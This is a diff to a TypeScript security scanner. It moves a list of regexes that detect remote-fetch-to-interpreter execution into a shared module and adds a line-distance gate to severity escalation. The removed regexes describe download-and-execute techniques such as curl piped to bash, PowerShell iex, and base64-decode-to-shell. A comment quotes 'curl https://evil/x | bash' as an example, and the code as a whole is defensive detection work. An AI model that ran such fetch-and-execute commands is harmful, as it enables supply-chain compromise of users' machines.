@@ -28,6 +28,10 @@ import type {
   LineContext,
 } from './security-scanner-edge.context.ts'
 import { isDocumentationContext } from './security-scanner-edge.context.ts'
+// SMI-6033 Wave 1: CODE_EXECUTION_PATTERNS moved to the patterns sibling (single
+// source of truth — this file previously re-declared the identical array inline
+// instead of importing it, so an edit to one copy silently didn't apply to the other).
+import { CODE_EXECUTION_PATTERNS } from './security-scanner-edge.patterns.ts'
 
 // ReDoS protection: maximum line length for regex matching (mirrors scanner).
 const MAX_LINE_LENGTH = 10000
@@ -40,39 +44,6 @@ function safeRegexTest(pattern: RegExp, input: string): RegExpMatchArray | null 
 // ============================================================================
 // code_execution: remote-fetch-to-interpreter patterns
 // ============================================================================
-
-/**
- * Every pattern requires BOTH a fetch verb (curl/wget/irm/iwr/Invoke-WebRequest/
- * Net.WebClient) AND an execution sink (| sh|python|node…, <(...), eval $(...),
- * iex, -EncodedCommand). A bare package install (npm/pip/brew/cargo/apt) matches
- * none. Bounded quantifiers exclude the pipe / newline — no catastrophic backtracking.
- *
- * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget patterns also
- * require a CONCRETE remote target (http(s):// or a host.tld domain), so a
- * code-review/security-review skill documenting the generic pattern in prose
- * ("curl … | sh", placeholder, no target) no longer matches, while a real
- * "curl https://evil/x | bash" still does.
- */
-export const CODE_EXECUTION_PATTERNS: RegExp[] = [
-  // curl|wget <target> | [sudo] <interpreter>
-  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,150}?\|\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
-  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
-  // command substitution into eval or `sh -c` with a remote target
-  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
-  // PowerShell download-and-execute
-  /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
-  // PowerShell encoded command
-  /\bpowershell\b[^\n]{0,60}?\s-e(?:nc|ncodedcommand)?\b\s*[A-Za-z0-9+/=]{16,}/i,
-  // decode-then-exec: base64 -d ... | <interpreter>  (SMI-5359 retro NIT: da sink + interpreters)
-  /\bbase64\s+(?:-d|--decode|-D)\b[^\n|]{0,60}?\|\s*(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // SMI-5424 FN-1: chained / redirect download-then-execute (curl URL -o /tmp/x && bash /tmp/x)
-  /(?:curl|wget)\b[^\n]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n]{0,150}?(?:&&|;)\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // SMI-5424 FN-2: npx executing a REMOTE source (URL or github:), never a local package (npx tsc is clean)
-  /\bnpx\s+(?:--yes\s+|-y\s+)?(?:https?:\/\/\S+|github:\S+)/i,
-  // SMI-5424 FN-4: node/python/deno/bun inline-eval (-e/-c) with a dangerous payload
-  /\b(?:node|python[23]?|deno|bun)\s+(?:-e|-c|--eval|--exec)\s+['"][^'"]{0,200}?(?:require\(|child_process|fetch\(|\bexec\b|eval\(|base64|urllib|os\.system|subprocess)/i,
-]
 
 /**
  * code_execution: single-emission — at most one MEDIUM finding per skill (first
@@ -237,12 +208,37 @@ export function scanObfuscatedDirective(lines: string[]): SecurityFinding[] {
 // ============================================================================
 
 const CODE_EXECUTION_CO_OCCURRENCE: ReadonlySet<SecurityFindingType> = new Set<SecurityFindingType>(
-  ['data_exfiltration', 'privilege_escalation', 'obfuscated_directive']
+  ['data_exfiltration', 'privilege_escalation', 'sensitive_path', 'obfuscated_directive']
 )
 
 /**
+ * Maximum line distance between the `code_execution` finding and the co-signal
+ * that escalates it (SMI-5880, ported here SMI-6033 Wave 1 — previously edge had
+ * no locality gate, so a co-signal ANYWHERE in the document escalated the single
+ * `code_execution` finding regardless of distance). Deliberately the same 40 as
+ * core's own constant (SecurityScanner.exec.ts) but kept as its own copy, not
+ * imported — edge twins cannot import from core and must carry their own copy.
+ */
+const MAX_CODE_EXECUTION_CO_SIGNAL_LINE_DISTANCE = 40
+
+/**
+ * Locality gate for `escalateCodeExecution`. Fail-CLOSED on missing metadata:
+ * when either side has no `lineNumber` the distance is unknowable, and this
+ * subsystem's convention is that missing metadata must never SILENTLY weaken
+ * detection. Every emitter of the four CODE_EXECUTION_CO_OCCURRENCE types sets
+ * `lineNumber` unconditionally, so this branch is unreachable through
+ * scanSkillContent today — kept explicit so a future detector that forgets
+ * `lineNumber` degrades safe instead of silently ceasing to escalate.
+ */
+function isWithinCoSignalWindow(codeExecLine?: number, coSignalLine?: number): boolean {
+  if (typeof codeExecLine !== 'number' || typeof coSignalLine !== 'number') return true
+  return Math.abs(codeExecLine - coSignalLine) <= MAX_CODE_EXECUTION_CO_SIGNAL_LINE_DISTANCE
+}
+
+/**
  * Escalate the code_execution finding to CRITICAL when a NON-documentation
- * high/critical exfil / privilege / obfuscation signal is also present. Mutates
+ * high/critical exfil / privilege / credential-path / obfuscation signal is
+ * also present WITHIN MAX_CODE_EXECUTION_CO_SIGNAL_LINE_DISTANCE lines. Mutates
  * in place. The non-doc gate keeps legitimate security-research skills (examples
  * in fenced blocks) at MEDIUM.
  */
@@ -255,11 +251,12 @@ export function escalateCodeExecution(findings: SecurityFinding[]): void {
       f !== codeExec &&
       CODE_EXECUTION_CO_OCCURRENCE.has(f.type) &&
       f.inDocumentationContext !== true &&
-      (f.severity === 'high' || f.severity === 'critical')
+      (f.severity === 'high' || f.severity === 'critical') &&
+      isWithinCoSignalWindow(codeExec.lineNumber, f.lineNumber)
   )
 
   if (hasDangerousCoSignal) {
     codeExec.severity = 'critical'
-    codeExec.message = `Remote fetch piped to an interpreter, co-occurring with exfiltration/privilege/obfuscation signals — likely supply-chain execution. ${codeExec.message}`
+    codeExec.message = `Remote fetch piped to an interpreter, co-occurring with exfiltration/privilege/credential signals — likely supply-chain execution. ${codeExec.message}`
   }
 }
